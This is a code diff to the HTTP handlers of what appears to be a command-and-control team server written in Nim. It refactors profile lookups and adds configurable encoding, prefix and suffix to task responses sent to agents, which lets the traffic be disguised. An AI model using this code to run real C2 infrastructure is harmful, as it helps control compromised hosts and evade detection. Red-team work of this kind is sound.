@@ -1,9 +1,9 @@
 import prologue, json, terminal, strformat, parsetoml, tables
 import sequtils, strutils, times, base64
-
+import sugar
 import ./handlers
 import ../[utils, globals]
-import ../../common/[types, utils, serialize]
+import ../../common/[types, utils, serialize, profile]
 
 proc error404*(ctx: Context) {.async.} = 
     resp "", Http404
@@ -19,11 +19,11 @@ proc httpGet*(ctx: Context) {.async.} =
         # Check heartbeat metadata placement
         var heartbeat: seq[byte]
         var heartbeatString: string
-        let heartbeatPlacement = cq.profile["http-get"]["agent"]["heartbeat"]["placement"]["type"].getStr()
+        let heartbeatPlacement = cq.profile.getString("http-get.agent.heartbeat.placement.type")
 
         case heartbeatPlacement: 
         of "header": 
-            let heartbeatHeader = cq.profile["http-get"]["agent"]["heartbeat"]["placement"]["name"].getStr()
+            let heartbeatHeader = cq.profile.getString("http-get.agent.heartbeat.placement.name")
             if not ctx.request.hasHeader(heartbeatHeader): 
                 resp "", Http404 
                 return
@@ -40,9 +40,9 @@ proc httpGet*(ctx: Context) {.async.} =
 
         # Retrieve and apply data transformation to get raw heartbeat packet
         let 
-            encoding = cq.profile["http-get"]["agent"]["heartbeat"]["encoding"]["type"].getStr("none")
-            prefix = cq.profile["http-get"]["agent"]["heartbeat"]["prefix"].getStr("")
-            suffix = cq.profile["http-get"]["agent"]["heartbeat"]["suffix"].getStr("")
+            encoding = cq.profile.getString("http-get.agent.heartbeat.encoding.type", default = "none")
+            prefix = cq.profile.getString("http-get.agent.heartbeat.prefix")
+            suffix = cq.profile.getString("http-get.agent.heartbeat.suffix")
 
         let encHeartbeat = heartbeatString[len(prefix) ..^ len(suffix) + 1]
 
@@ -53,7 +53,7 @@ proc httpGet*(ctx: Context) {.async.} =
             heartbeat = string.toBytes(encHeartbeat) 
 
         try: 
-            var response: seq[byte]
+            var responseBytes: seq[byte]
             let tasks: seq[seq[byte]] = getTasks(heartbeat)
 
             if tasks.len <= 0: 
@@ -62,17 +62,31 @@ proc httpGet*(ctx: Context) {.async.} =
 
             # Create response, containing number of tasks, as well as length and content of each task
             # This makes it easier for the agent to parse the tasks
-            response.add(cast[uint8](tasks.len))
+            responseBytes.add(cast[uint8](tasks.len))
 
             for task in tasks:
-                response.add(uint32.toBytes(uint32(task.len))) 
-                response.add(task)
+                responseBytes.add(uint32.toBytes(uint32(task.len))) 
+                responseBytes.add(task)
             
+            # Apply data transformation to the response
+            var response: string
+            let 
+                encoding = cq.profile.getString("http-get.server.output.encoding.type", default = "none")
+                prefix = cq.profile.getString("http-get.server.output.prefix")
+                suffix = cq.profile.getString("http-get.server.output.suffix")
+
+            case encoding: 
+            of "none": 
+                response = Bytes.toString(responseBytes)
+            of "base64":
+                response = encode(responseBytes, safe = cq.profile.getBool("http-get.server.output.encoding.url-safe"))
+            else: discard
+
             # Add headers, as defined in the team server profile 
-            for header, value in cq.profile["http-get"]["server"]["headers"].getTable():
+            for header, value in cq.profile.getTable("http-get.server.headers"):
                 ctx.response.setHeader(header, value.getStr())
 
-            await ctx.respond(Http200, Bytes.toString(response), ctx.response.headers)
+            await ctx.respond(Http200, prefix & response & suffix, ctx.response.headers)
             ctx.handled = true # Ensure that HTTP response is sent only once 
 
             # Notify operator that agent collected tasks
@@ -102,7 +116,7 @@ proc httpPost*(ctx: Context) {.async.} =
             let header = unpacker.deserializeHeader()
 
             # Add response headers, as defined in team server profile
-            for header, value in cq.profile["http-post"]["server"]["headers"].getTable():
+            for header, value in cq.profile.getTable("http-post.server.headers"):
                 ctx.response.setHeader(header, value.getStr())
 
             if cast[PacketType](header.packetType) == MSG_REGISTER: 
